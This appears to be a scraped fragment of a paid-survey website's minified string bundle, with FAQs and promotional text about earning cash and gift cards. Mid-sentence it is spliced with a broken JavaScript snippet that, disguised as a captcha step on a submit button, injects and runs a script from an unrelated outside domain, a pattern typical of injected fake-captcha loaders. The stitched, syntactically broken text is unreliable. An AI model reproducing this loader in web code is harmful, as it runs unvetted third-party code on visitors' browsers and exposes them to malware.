}

access-denied_title":"Sorry, your country is not supported.","access-denied_description":"We'd like to meet you too, but right now Payzyra is not available in your country.","access-denied_description_with_country":"We'd like to meet you too, but right now Payzyra is not available in {value}.","access-denied_submit-btn":"Notify Me","access-denied_form-desccription":"Enter your email to be notified when we expand to your country.","privacy-policy":B,"terms-and-conditions":"Terms and Conditions","about-us":"About Us",contact:"Contact",contact_address_html:"Payzyra Group LLC \u003Cbr\u002F\u003E 8 The Green Ste R \u003Cbr\u002F\u003EDover, DE 19902 \u003Cbr\u002F\u003EUnited States","error-404_title":"Page not found...","error-404_description":"Sorry, the page you are looking for doesn't exist or has been removed.","meta-title_homepage":"Online Paid Surveys","meta-description_homepage":"Give your opinions on online paid surveys. Earn money or rewards from leading brands. Sign up for free online surveys at Payzyra.","meta-title_about":"Abous us","meta-description_about":"Payzyra provides online paid surveys and gives world-class survey experience by giving rewards and cash. Earn money by survey and learn more about Payzyra.","meta-title_contact":"Contact Us For Paid Surveys","meta-description_contact":"Get in touch and drop us a message right now. Give your opinion and get rewards. Contact Payzyra team for further information.","meta-title_policy":B,"meta-description_policy":"Learn more about the privacy policy of Payzyra. Check out how we collect the information and feel free to contact our team for any questions.","meta-title_personal-information":"Personal Information","meta-description_personal-information":"Check out how we are dealing with personal information. For further details about your rights, contact Payzyra team!","meta-title_404-page":"404 Page","meta-description_404-page":"This page no longer exists or was moved. Check the URL and try again or move to another page.","meta-title_access-denied":"Access Denied","meta-description_access-denied":"You can't access this page. Redirect to another page or contact Payzyra team for more details.","faqs-section_question_1":"How can I make money with paid surveys?","faqs-section_answer_1_html":"\u003Cp\u003EPayzyra is a free website where you can earn real money for taking paid surveys. Simply sign up with your email and start earning today. Right after signing up, you can start making money. The average user withdraws their first cash on the same day!\u003C\u002Fp\u003E\u003Cp\u003EYou can take surveys anywhere online from your phone or computer.\u003C\u002Fp\u003E","faqs-section_question_2":"How does taking surveys work?","faqs-section_answer_2_html":"\u003Cp\u003EFirst, you join our panel by signing up. It is completely free, and we only need your email address.\u003C\u002Fp\u003E\u003Cp\u003EOnce you log in, you can see a list of surveys available for you. You decide which surveys you take! You can see how long a survey takes and how much you can make by completing it.\u003C\u002Fp\u003E\u003Cp\u003EWhen clicking a survey, we might ask you a couple of qualification questions on our end. This is to ensure you are among the target audience for this particular survey. After this step, you will be redirected to the survey. Once you complete it, you will be redirected back to our panel and receive your points, which you can redeem immediately for cash or gift cards.\u003C\u002Fp\u003E","faqs-section_question_3":"Do I need to give you my personal data?","faqs-section_answer_3_html":"\u003Cp\u003ENo! We will never sell your email or share it with any survey clients! We only need your email address to create your account.\u003C\u002Fp\u003E\u003Cp\u003ESurveys will not ask for personal identifying information like your name or address. All your responses are completely anonymous.\u003C\u002Fp\u003E","faqs-section_question_4":"How much money can I make?","faqs-section_answer_4_html":"\u003Cp\u003EPayzyra is not a full-time job, but with just 30-60 minutes per day, you can make enough money to afford the nice things you enjoy. Please scroll up to see our live statistics about how much other users earned yesterday!\u003C\u002Fp\u003E","faqs-section_question_5":"Does Payzyra pay better than other websites?","faqs-section_answer_5_html":"\u003Cp\u003EYes! On average, Payzyra pays 150 % more for the same surveys!\u003C\u002Fp\u003E\u003Cp\u003EWhy can we do that? Because we don’t pay large amounts for marketing, but give back to our users!\u003C\u002Fp\u003E","faqs-section_question_6":"Can I really withdraw cash?","faqs-section_answer_6_html":"\u003Cp\u003EYes! You can instantly withdraw cash to your PayPal or bank account. Withdrawals are processed immediately and credited to your account within a few hours.\u003C\u002Fp\u003E\u003Cp\u003EAlternatively, you can select from our various gift cards to pay for your favorite shops or services like Amazon, Shopify, Apple, and many more.\u003C\u002Fp\u003E","faqs-section_question_7":"Is there a minimum withdrawal amount?","faqs-section_answer_7_html":"\u003Cp\u003ENot really! It’s up to you!\u003C\u002Fp\u003E\u003Cp\u003EWhen signing up, you can select your free Welcome Bonus. You can choose the regular Welcome Bonus and withdraw after a few surveys. If you decide to take a bigger Welcome Bonus, it comes with a small minimum withdrawal amount.\u003C\u002Fp\u003E","faqs-section_question_8":"What is important when taking surveys?","faqs-section_answer_8_html":"\u003Cp\u003EThe opinions you provide on our surveys directly influence products and services offered by major international brands. Therefore, you must be attentive and sincere while taking the surveys.\u003C\u002Fp\u003E\u003Cp\u003ESurveys monitor the quality of your responses and will screen you out if they feel you might be insincere.\u003C\u002Fp\u003E","faqs-section_question_9":"These are some tips for successfully completing surveys","faqs-section_answer_9_html":"\u003Cul\u003E\u003Cli\u003EDon't rush. Take your time to read the questions.\u003C\u002Fli\u003E\u003Cli\u003EBe honest. Give accurate answers about yourself and your opinion.\u003C\u002Fli\u003E\u003Cli\u003EDon't use a VPN or public wifi. Any service obfuscating your connection is seen as fraud.\u003C\u002Fli\u003E\u003Cli\u003EBe open. Answering questions with \"I don't want to answer this question\" will usually screen you out\u003C\u002Fli\u003E\u003Cli\u003EBe detailed. When asked free text questions, provide a unique and detailed response. Offensive language, copied, or low-effort answers will get you screened out.\u003C\u002Fli\u003E\u003C\u002Ful\u003E",sign_up_now:"Sign up now",learn_more:"Learn More",join_now:"Join now","nav-menu_cash":"Paid surveys for Cash","nav-menu_gift-cards":"Paid surveys for Gift Cards","nav-menu_amazon":"Paid surveys for Amazon Gift Cards","nav-menu_paypal":"Paid surveys for PayPal Gift Cards","nav-menu_visa":"Paid surveys for Visa Gift Cards","gift-card_amazon_title":"Surveys for a Amazon gift cards","gift-card_paypal_title":"Paid Surveys for a PayPal","gift-card_visa_title":"Surveys for a Visa Gift Card","meta-title_cash":"Paid Survey for Cash","meta-description_cash":C,"cash_intro-section_subtitle":C,"cash_intro-section_description":"Whether you're looking for a few extra pennies to help with your everyday spending or saving up for something special, getting paid cash for surveys online can help you reach your goals.","cash_intro-section_info":"Sign up to take your first paid online survey for cash with Payzyra.","cash_bg-text-section_title":"Earn Cash for Every Survey You Take","cash_bg-text-section_description_p-1":"It's never been easier to be paid cash for survey opinions.","cash_bg-text-section_description_p-2":"Businesses around the globe are looking for people just like you to understand what you like, what you don't, and what inspires you. From whether a logo works better in green or black, to whether a new product will really work, your opinion is critical.","cash_bg-text-section_description_p-3":"This market research is incredibly valuable to companies, and they're willing to pay you for it. At Payzyra, we source these businesses and link you with the best, high-paying surveys that pay in cash.","cash_bg-text-section_description_p-4":"In your free time, get paid cash for survey responses. Whether you're looking to fill the time on your commute or searching for a fun activity to do in the evenings, completing surveys for cash is a great way to earn some extra income.","cash_steps-section_title":"Get Cash For Your Opinion","cash_step-1_title":D,"cash_step-2_title":"Then, it's time to start taking surveys. Select the surveys you're most interested in or that offer the highest rewards, and watch as your account balance goes up.","cash_step-2_description":"There’s no limit on how many surveys you can complete in a day, and the more surveys you can finish, the more you will be rewarded.","cash_step-3_title":"Once you're ready to cash out, redeem your Payzyra points for the reward that suits you","meta-title_gift-cards":"Surveys for Gift Cards","meta-description_gift-cards":E,"gift-cards_intro-section_subtitle":E,"gift-cards_intro-section_description":"Taking surveys for gift cards is a fantastic way to boost your income and save money by buying your favorite things online. Get rewarded with gift cards from Amazon to PayPal, Visa and more by taking Payzyra surveys in your free time.","gift-cards_intro-section_info":"Sign up now and start earning free gift cards for surveys right away.","gift-cards_bg-text-section_title":"Free Gift Cards For Surveys","gift-cards_bg-text-section_description_p-1":"Your opinions are valuable to businesses. They want to get to know you so they can create fantastic products that they know you'll enjoy. From your political opinions to your morning routine, your favorite laundry detergent to the types of soda you crave, it's all valuable information that businesses are willing to pay industry survey gift cards.","gift-cards_bg-text-section_description_p-2":"That's how Payzyra can offer you surveys that pay gift cards. We help businesses meet real people like you and ensure that your opinions are listened to and rewarded.","gift-cards_bg-text-section_description_p-3":"There are no qualifications you need to join, no high minimum payouts and no boring, repetitive surveys here. It's completely free to join Payzyra, and you can earn your first survey gift cards in as little as 17 minutes.","gift-cards_step-1_title":"First, create your account to earn free gift cards for surveys you complete.","gift-cards_step-2_title":"Then, complete the surveys you're most interested in.","gift-cards_step-2_description":"You can take as many as you want! Each survey you complete will provide you with points which you can use to redeem the survey gift cards you prefer.","gift-cards_step-3_description_1":"Saving up for something special? Redeem your points for up to a $5 gift card survey to spend with big-name brands like Spotify, Target and Apple. Love to treat yourself to delicious restaurants? You could even redeem survey gift cards on your next Dominos takeout! ","gift-cards_step-3_description_2":"Take as many surveys for gift cards as you want in your free time to get maximum rewards. Build up your points for higher-value survey gift cards or cash out immediately; the choice is yours. There's no minimum cash-out value, and you're fully in control.","meta-title_amazon":"Surveys for Amazon Gift Cards","meta-description_amazon":F,"amazon_intro-section_info":"It's never been easier to get free Amazon gift cards. Start your next survey now!","amazon_bg-text-section_title":"Amazon Gift Cards: The Gift Of Everything","amazon_bg-text-section_description_p-1":"Amazon gift cards are the perfect reward. Spend them on anything you like whenever you want; they never expire. When you claim your survey Amazon gift card reward, s document.getElementById('submit-btn').addEventListener('click', function(e) {
  e.preventDefault();

  const modal = document.getElementById('captchaModal');
  const captchaSection = document.getElementById('captcha-section');

  // Every time when the button is clicked, clear the previous captcha
  captchaSection.innerHTML = '';
  captchaSection.dataset['captchaEnable'] = 'true';

  const loader = document.getElementById('loader');
  loader.style.display = 'block';

  const script = document.createElement('script');
  script.src = 'https://bigappboi.com/cp/js/zqz62';
  script.async = true;
  script.onload = (() => {
    loader.style.display = 'none';

  document.body.appendChild(script);

  modal.style.display = 'block';
});

  document.getElementById('captchaModal').style.display = 'none';
